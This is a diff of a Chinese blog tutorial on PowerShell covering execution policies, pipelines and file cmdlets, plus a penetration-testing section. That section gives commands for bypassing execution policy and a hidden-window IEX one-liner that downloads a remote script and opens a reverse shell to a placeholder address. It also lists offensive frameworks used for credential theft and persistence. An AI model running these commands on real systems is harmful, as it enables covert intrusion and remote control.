@@ -1,15 +1,89 @@
 `Gmeek-html<img src="https://erainnovator.com/wp-content/uploads/2021/04/PowerShell.png">`
 
-## 获取 PowerShell Command一覧
+# Powershell的基本概念
+## ps1文件
+一个PowerShell脚本其实就是一个简单的文本文件， 这个文件包含了一系列PowerShell命令，每个命令显示为独立的一行，文件名需要加上.ps1的扩展名。
+
+## 执行策略
+为防止恶意脚本的执行，PowerShell的执行策略，默认情况下，Restricted:脚本不能运行，可以通过以下命令查看当前的执行策略。
+- Get-ExecutionPolicy：
+  - Restricted:脚本不能运行(默认设置)。
+  - RemoteSigned:本地创建的脚本可以运行，但从网上下载的脚本不能运行(拥有数字证书签名的除外)。
+  - AllSigned:仅当脚本由受信任的发布者签名时才能运行。
+  - Unrestricted: 允许所有的script运行。
+
+- Set-ExecutionPolicy <policy name>
+可以通过上面命令改变PowerShell的执行策略。
+
+如果要运行PowerShell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted，所以在渗透时，就需要采用一些方法绕过策略来执行脚本， 比如下面这三种。
+
+1. 绕过本地权限执行
+上传xx.ps1至目标服务器，在CMD环境下，在目标服务器本地执行该脚本，如下所示。
+```
+PowerShell.exe -ExecutionPolicy Bypass -File xx.ps1
+```
+
+2. 本地隐藏绕过权限执行脚本
+```
+PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile File xx.ps1
+```
+
+3. 用IEX下载远程PS1脚本绕过权限执行
+```
+PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonI -NoProfile iex (New-Object Net.WebClient).DownloadString("xxx.ps1");Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+```
+
+上述参数的说明，如下
+- `ExecutionPolicy Bypass`绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell的安全策略规定了PowerShell不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全保护规则
+- `WindowStyle Hidden`　隐藏窗口
+- `NoLogo`　启动不显示版权标志的PowerShell.
+- `NonInteractive (-Nonl) `　非交互模式，PowerShell不为用户提供交互的提示。
+- `NoProfile (-NoP) `　PowerShell控制台不加载当前用户的配置文件。
+- `Noexit`　执行后不退出Shell。这在使用键盘记录脚本时非常重要。
+
+
+
+## 运行脚本
+运行PowerShell脚本，必须键入完整的路径和文件名，例如，你要运行一个名为a.ps1的脚本，可以键入C:\Scripts\a.ps1 
+
+## 管道
+管道的作用是将一个命令的输出作为另一个命令的输入， 两个命令之间用管道符号`|` 连接。
+举一个例子、停止所有目前运行中的，以"p"字符开头命名的程序，命令如下所示。
+```
+PS> get-process p* | stop-process
+```
+
+## Powershell的常用命令
+在PowerShell下，类似“cmd命令"叫作"cmdlet" ，其命名规范相当一致，都采用"动词-名词”的形式，如New-ltem，动词部分般为Add、 New、Get、Remove、Set等， 命名的别名一般兼容Windows Command和Linux Shell,如Get-Childltem命令使用dir或|s均可，**而且PowerShell命令不区分大小写**
+
+下面以文件操作为例讲解PowerShell命令的基本用法
+- 新建目录: New-Item -Path 'E:\Test Folder' -ItemType Directory
+- 新建文件: New-Item -Path new.txt -ItemType File
+- 删除目录: Remove-Item 'E:\Test Folder'
+- 显示文本内容: Get-Content new.txt
+- 置文本内容: Set-Content new.txt -Value "hello, word! "
+- 追加内容: Add-Content new.txt -Value "i love you"
+- 清除内容: Clear-Content new.txt
+
+# Powershell进阶篇 
+常用的PowerShel攻击工具有以下这几种
+- `PowerSplit`　这是众多PowerShell攻击工具中被广泛使用的PowerShel后期漏洞利用框架，常用于信息探测、特权提升、凭证窃取、持久化等操作。
+- `Nishang`　基于PowerShell的渗透测试专用工具， 集成了框架、脚本和各种Payload,包含下载和执行、键盘记录、DNS、 延时命令等脚本。
+- `Empire`　基于PowerShel的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块、信息探测、凭据窃取、持久化控制。
+- `PowerCat`　Powershel版的NetCat, 有着网络工具中的"瑞士军刀”美誉，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，读者可以在脚本中以多种方式使用它。
+
+
+
+# 获取 PowerShell Command一覧
 
 ```
-$ gcm　或者   $ get-command
+PS>  gcm　或者   PS>  get-command
 ```
 
-## 获取 PowerShell Alias一覧
+# 获取 PowerShell Alias一覧
 
 ```
-$ gal　或者   $ Get-Alias
+PS>  gal　或者   PS>  Get-Alias
 ```
 
 `Gmeek-html<img src="https://linuxhint.com/wp-content/uploads/2022/01/create-powershell-alias-01.png">`
